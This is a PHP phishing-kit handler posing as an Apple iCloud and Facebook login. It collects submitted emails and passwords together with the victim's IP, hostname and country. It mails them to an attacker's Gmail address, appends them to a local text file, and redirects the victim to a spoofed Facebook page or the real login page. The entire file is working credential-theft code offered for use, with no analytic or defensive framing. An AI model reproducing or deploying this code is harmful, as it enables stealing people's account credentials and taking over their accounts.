<?php
session_start()   ;
//$_SESSION['count'] = $_SESSION['count']++ ;
error_reporting(0);


$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);

// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);

$message .= "Email:    : ".$_POST['email']." ";
$message .= "|***|Password : ".$_POST['pass']."  ";
$message .= "|***|Client IP: ".$ip."  ";
$message .= "|***|HostName : ".$hostname." ";
$send = "bouha51@gmail.com";
$subject = " Apple ICLOUD Resultat Login ";

$id=$_POST['email'];
$pass=$_POST['pass'];

$monfichier = fopen('spamfb.txt','a+');
fputs($monfichier,"\r\n".'Email = '. $id."\r\n".'Password = '.$pass."\r\n"."IP = ".$ip."\r\n".'Hostname ='.$hostname."\r\n"."Country = ".$country_name."\r\n");
fputs($monfichier,"==========================================================================="); 
fclose($monfichier);

mail($send, $subject,$message);   
if(!isset($_SESSION['count']))
{
print("<script type=\"text/javascript\">setTimeout('location=(\"http://apple-conseil.byethost10.com/facebook.com/facebook.html"."\")' ,0);</script>");
$_SESSION['count']++;
}
else
{
print("<script type=\"text/javascript\">setTimeout('location=(\"https://www.facebook.com/login.php?login_attempt=1&email=".$id."&lgndim=eyJ3IjoxMjUyLCJoIjo3MDQsImF3IjoxMjUyLCJhaCI6NjY3LCJjIjoyNH0=&u_0_x=eyJ3IjoxMjUyLCJoIjo3MDQsImF3IjoxMjUyLCJhaCI6NjY3LCJjIjoyNH0=&qsstamp=W1tbNDgsNTcsNzAsNzEsODMsMTI1LDEzMywxMzcsMTQ4LDE1MCwxNjEsMTc4LDIwOSwyMTEsMjE1LDIyMCwyNTEsMjY1LDI3NCwyOTYsMjk5LDMxNywzMjEsMzUzLDM2NywzODIsMzk2LDQyMiw0NTEsNDU1LDQ1Nyw0NjksNDc3LDQ5Nyw1MzgsNTQ2LDU1MSw1NTQsNTU5LDYxMiw2MTksNzY4XV0sIkFabENlc1p2TzlscGFQcHZBYlNDSnBBTzB2RDVtWmhyVV9YOHlDRzVyc0NKYTBzU1JXMFJHa2pQOHJ5VEFGLUlIQUhPdHNvTi1CUWwzQUlCX0h3Q3RhbmhYWnBaY0dJXy02dUFiYkJnWjNLNTRSR0xXRmFmNjIwbVd1Q2VsTzUyM3JLa3ZrYUdjZXBpV2ticDVmc1NxbWpBTVNKSGd0WlRaTkhBczB0YldIQmtQTmRJODZ5UVZqU2xiNkRTbFFSVFNCZG9EVEV4WnhUQXVLTTVPNVlacVZCQzJwR1hwQ0lIWWhTZ0NBVC1FVDg1YzRTTmFNZFhzZTJzX2p0QzFROFk0NHciXQ"."\")' ,0);</script>");
}


?>
